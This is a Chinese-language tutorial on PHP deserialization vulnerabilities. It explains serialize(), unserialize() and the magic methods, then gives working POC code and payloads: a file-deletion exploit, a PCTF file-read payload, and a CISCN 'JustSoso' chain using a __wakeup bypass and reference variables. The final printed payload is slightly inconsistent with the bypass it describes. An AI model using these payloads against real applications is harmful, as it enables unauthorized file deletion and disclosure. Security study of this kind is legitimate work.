# PHP反序列化漏洞理解和应用



php反序列化漏洞，又叫php对象注入漏洞，是一种常见的漏洞，在我们进行代码审计以及CTF中经常能够遇到。

### 参考文章：

<https://www.cnblogs.com/Mrsm1th/p/6835592.html>
<http://p0desta.com/2018/04/01/php反序列化总结/>
<http://whc.dropsec.xyz/2017/06/15/PHP反序列化漏洞理解与利用/>
<https://p0sec.net/index.php/archives/114/>

## 学习前最好提前掌握的知识
- [PHP类与对象](https://www.php.net/manual/zh/language.oop5.php)
- [PHP魔术方法](https://secure.php.net/manual/zh/language.oop5.magic.php)
- [serialize()](http://php.net/manual/zh/function.serialize.php)与[unserialize()](http://php.net/manual/zh/function.unserialize.php)

# 序列化与反序列化

PHP （从 PHP 3.05 开始）为保存对象提供了一组序列化和反序列化的函数：serialize、unserialize。

## serialize()

当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用。测试代码如下；

```php
<?php
class people
{
	public $name = "f1r3K0";
  public $age = '18';
}

$class = new people();
$class_ser = serialize($class);
print_r($class_ser);
?>
```

测试结果：

```php
O:6:"people":2:{s:4:"name";s:6:"f1r3K0";s:3:"age";s:2:"18";}
```

![EnWYYq.md.png](https://s2.ax1x.com/2019/04/26/EnWYYq.md.png)
- 注意这里的括号外边的为大写英文字母`O`
- 下面是字母代表的类型
a - array 数组
b - boolean布尔型
d - double双精度型
i - integer
o - common object一般对象
r - reference
s - string
C - custom object 自定义对象
O - class
N - null
R - pointer reference
U - unicode string unicode编码的字符串

## unserialize()

与 serialize() 对应的，unserialize()可以从序列化后的结果中恢复对象（object），我们翻阅PHP手册发现官方给出的是：unserialize — 从已存储的表示中创建 PHP 的值。

我们可以直接把之前序列化的对象反序列化回来来测试函数，如下：

```php
<?php
class people
{
    public $name = "f1r3K0";
    public $age = '18';
}

$class =  new people();
$class_ser = serialize($class);
print_r($class_ser);
$class_unser = unserialize($class_ser);
print_r($class_unser);

?>
```

![Enfv26.md.png](https://s2.ax1x.com/2019/04/26/Enfv26.md.png)
提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。（先埋个伏笔，这个点后面会提）

# 反序列化漏洞

由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个"精心”构造的序列化字符串，从而控制对象内部的变量甚至是函数。

## 利用构造函数等

### Magic function

php中有一类特殊的方法叫“[Magic function](https://secure.php.net/manual/zh/language.oop5.magic.php)”，就是我们常说的"魔术方法" 这里我们着重关注一下几个：

- `__construct()`：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
- `__destruct()`：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。
- `__wakeup() `：如前所提，unserialize()时会检查是否存在`__wakeup()`，如果存在，则会优先调用`__wakeup()`方法。
- `__toString()`:用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。
- `__sleep()`:用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。

测试如下：

```php
<?php
class people
{
    public $name = "f1r3K0";
    public $age = '18';
    function __wakeup()
    {
        echo "__wakeup()";
    }
    function __construct()
    {
        echo "__consrtuct()";
    }
    function __destruct()
    {
        echo "__destruct()";
    }
    function __toString()
    {
        echo "__toString";
    }
    /*function __sleep()
    {
        echo "__sleep";
    }*/
}

$class =  new people();
$class_ser = serialize($class);
print_r($class_ser);
$class_unser = unserialize($class_ser);
print_r($class_unser);

?>

```

结果如下：

![EnfxxK.md.png](https://s2.ax1x.com/2019/04/26/EnfxxK.md.png)
从运行结果来看，我们可以看出unserialize函数是优先调用"__wakeup()"再进行的反序列化字符串。同时，对于其他方法的调用顺序也一目了然了。（注意：这里我将sleep注释掉了，因为sleep会在序列化的时候调用，因此执行sleep方法就不会再执行序列以及之后的操作了。）

### 利用场景

#### __wakeup()和destruct()

由前可以看到，unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。我们这里直接使用参考文章的例子，代码如下：

```php
//logfile.php 删除临时日志文件
<?php
class LogFile {
    //log文件名
    public $filename = 'error.log';
    //存储日志文件
    public function LogData($text) {
        echo 'Log some data:' . $text . '<br />';
        file_put_contents($this->filename, $text, FILE_APPEND);
    }
    //Destructor删除日志文件
    public function __destruct() {
        echo '__destruct delete' . $this->filename . 'file.<br />';
        unlink(dirname(__FILE__) . '/' . $this->filename); //删除当前目录下的filename这个文件
    }
}
?>
```

```php
//包含了’logfile.php’的主页面文件index.php
<?php
include 'logfile.php';
class User {
    //属性
    public $age = 0;
    public $name = '';
    //调用函数来输出类中属性
    public function PrintData() {
        echo 'User' . $this->name . 'is' . $this->age . 'years old.<br />';
    }
}
$usr = unserialize($_GET['user']);
?>

```

梳理下这2个php文件的功能，index.php是一个有php序列化漏洞的主业文件，logfile.php的功能就是在临时日志文件被记录了之后调用
`__destruct`方法来删除临时日志的一个php文件。
这个代码写的有点逻辑漏洞的感觉，利用这个漏洞的方式就是，通过构造能够删除source.txt的序列化字符串，然后get方式传入被反序列化函数,反序列化为对象，对象销毁后调用__destruct()来删除source.txt.

##### 漏洞利用exp

```php
<?php
include 'logfile.php';
$obj = new LogFile();
$obj->filename = 'source.txt'; //source.txt为你想删除的文件
echo serialize($obj) . '<br />';
?>
```

这里我们通过['GET']传入序列化字符串，调用反序列化函数来删除想要删除的文件。

![img](https://ooo.0o0.ooo/2017/07/02/5958ea576aa34.png)



之前还看到过一个wakeup()非常有意思的例子，这里直接上链接了

chybeta浅谈PHP反序列化 (https://chybeta.github.io/2017/06/17/浅谈php反序列化漏洞/

#### 其它magic function的利用

这里我就结合PCTF和今年国赛上的题来分析了

#### PCTF

[题目链接](http://web.jarvisoj.com:32768/index.php)

- 前面几步都是很常见的读文件源码

  这里直接放出给的两个源码

```php
//index.php
<?php 
    require_once('shield.php');
    $x = new Shield();
    isset($_GET['class']) && $g = $_GET['class'];
    if (!empty($g)) {
        $x = unserialize($g);
    }
    echo $x->readfile();
?>
```
上边index.php提示了包含的shield.php所以说直接构造base64就完事了

```php
//shield.php
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = '') {
            $this -> file = $filename;
        }
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
```

index.php 1.包含了一个shield.php 2.实例化了Shiele方法 3.通过[GET]接收了用户反序列化的内容，输出了readfile()方法

shield.php 1.首先就能发现file是可控的（利用点） 2.construct()在index中实例化的时候就已经执行了，因此不会影响我们对可控$file的利用。

###### 构造poc

```php
<?php
	class Shield
	{
		public $file = "pctf.php";
	}
	$flag = new Shield();
	print_r(serialize($flag));
?>
```

![EnhOeg.md.png](https://s2.ax1x.com/2019/04/26/EnhOeg.md.png)
最终poc:

<http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}>

#### ciscn2019 web1- JustSoso

读源码的过程省略

```php
//index.php
<html>
<?php
error_reporting(0); 
$file = $_GET["file"]; 
$payload = $_GET["payload"];
if(!isset($file)){
	echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
	die('hack attacked!!!');
}
@include($file);
if(isset($payload)){  
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) { 
    	    die('stop hacking!');
    	    exit();
        }
    }
    $payload = unserialize($payload);
}else{ 
   echo "Missing parameters"; 
} 
?>
<!--Please test index.php?file=xxx.php -->
<!--Please get the source of hint.php-->
</html>
```

```php
<?php
class Handle{ 
    private $handle;  
    public function __wakeup(){
		foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
	public function __construct($handle) { 
        $this->handle = $handle; 
    } 
	public function __destruct(){
		$this->handle->getFlag();
	}
}

class Flag{
    public $file;
    public $token;
    public $token_flag;
    function __construct($file){
		$this->file = $file;
		$this->token_flag=&$this->token;
    }
	public function getFlag(){
		$this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
		{
			if(isset($this->file)){
				echo @highlight_file($this->file,true); 
            }  
        }
    }
}
```

其实刚开始做的时候是很懵逼了，一直在纠结爆破md5上边。22233333

1.首先我们需要绕的就是`$url = parse_url($_SERVER['REQUEST_URI']);`
使得`parse_str($url['query'],$query);` 中query解析失败，这样就可以在payload里出现flag，这里应该n1ctf的web eating cms的绕过方式，添加` ///index.php`绕过。

2.接下来就是需要我们绕过wakeup()里的将$k赋值为空的操作，这里用到的是一枚cve **当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)**

3.绕md5这里用到了PHP中引用变量的知识<https://blog.csdn.net/qq_33156633/article/details/79936487>

简单来说就是，当两个变量指向同一地址时，例如：`$b=&$a`,这里的`$b`指向的是`$a`的区域，这样b就随着a变化而变化，同样的原理，我们在第二步序列化时加上这一步

```php
$b = new Flag("flag.php");
$b->token=&$b->token_flag;
$a = new Handle($b);
```

这样最后的token就和token_flag保持一致了。

最后的POC

```php
<?php
class Handle
{       
    private $handle;        
    public function __wakeup()
    {
            foreach(get_object_vars($this) as $k => $v)
	    {
                $this->$k = null;         
            }          
            echo "Waking upn";      
    }
    public function __construct($handle) 
    {           
        $this->handle = $handle;       
    }    
    public function __destruct()
    {    
        $this->handle->getFlag();   
    }  
}    
class Flag
{      
    public $file;      
    public $token;      
    public $token_flag;         
    function __construct($file)
    {    
        $this->file = $file;    
        $this->token_flag = $this->token = md5(rand(1,10000));      
    }         
    public function getFlag()
    {       
        if(isset($this->file))
	{      
            echo @highlight_file($this->file,true);               
        }            
    }  
}
$b = new Flag("flag.php");
$b->token=&$b->token_flag;
$a = new Handle($b);
echo(serialize($a));
?>
```

![En4uSx.md.png](https://s2.ax1x.com/2019/04/26/En4uSx.md.png)
这里还有一个点就是我们需要用%00来补全空缺的字符，又因为含有private 变量，需要 encode 一下。

最终payload：

`?file=hint&payload=O:6:"Handle":1:{s:14:"Handlehandle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";s:32:"da0d1111d2dc5d489242e60ebcbaf988";s:10:"token_flag";R:4;}}`                                                               


![En22U1.jpg](https://s2.ax1x.com/2019/04/26/En22U1.jpg)
## 利用普通成员方法

前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说大佬们去白盒审计的时候都要盯紧这些敏感函数的联系，层层递进，最终去构造出一个有杀伤力的payload。



